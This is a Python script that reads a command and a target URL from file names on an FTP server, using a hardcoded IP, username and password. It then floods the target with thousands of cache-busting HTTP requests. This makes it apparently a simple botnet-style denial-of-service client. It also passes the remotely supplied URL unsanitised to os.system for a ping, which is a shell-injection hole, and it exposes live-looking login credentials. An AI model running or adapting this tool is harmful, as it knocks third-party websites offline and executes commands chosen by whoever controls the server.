from ftplib import FTP_TLS
from os import system
import requests
import time
import progressbar

ftp=FTP_TLS()
ftp.set_debuglevel(2)
ftp.connect('185.98.131.226')
ftp.sendcmd('USER eleev1428517')
ftp.sendcmd('PASS pB2@d$ZRhR')
files = []
ftp.dir(files.append)
print(files)
file=files
requete = file[3]
requeteurl = file[4]
objectif = requete[62] + requete[63] + requete[64] + requete[65] + requete[66] +requete[67]
print(objectif)

if objectif == ("ping.."):
	h = {
    "Cache-Control": "no-cache", "Pragma": "no-cache"
	}
	compteur = 0
	tour = 0
	http=("http://")
	url0 = requeteurl[62] + requeteurl[63] + requeteurl[64] + requeteurl[65] + requeteurl[66] +requeteurl[67] + requeteurl[68] + requeteurl[69] + requeteurl[70] + requeteurl[71] + requeteurl[72] + requeteurl[73]  + requeteurl[74] + requeteurl[75] + requeteurl[76] + requeteurl[77] + requeteurl[78] + requeteurl[79] + requeteurl[80] + requeteurl[81] + requeteurl[82] + requeteurl[83] + requeteurl[84] + requeteurl[85] + requeteurl[86] + requeteurl[87] + requeteurl[73] + requeteurl[88] + requeteurl[89] + requeteurl[90] + requeteurl[91] + requeteurl[92] + requeteurl[93] + requeteurl[94] + requeteurl[95] + requeteurl[96] + requeteurl[97] + requeteurl[98] + requeteurl[99] + requeteurl[100] + requeteurl[101]
	url0 = str(url0)
	url1 = url0.split('_')
	url1 = url1[0]
	print(url1)
	urlcible = url1
	urlcible = "https://" + urlcible
	while tour < 10:
		print("Envoi de 1000 requêtes")	
		while compteur < 1000:
			for i in progressbar.progressbar(range(1000)):
				request = requests.get(urlcible, headers=h)
				compteur = compteur + 1
			
				if compteur == 1000:
					system("ping " + url1)
					tour = tour + 1
					compteur = 0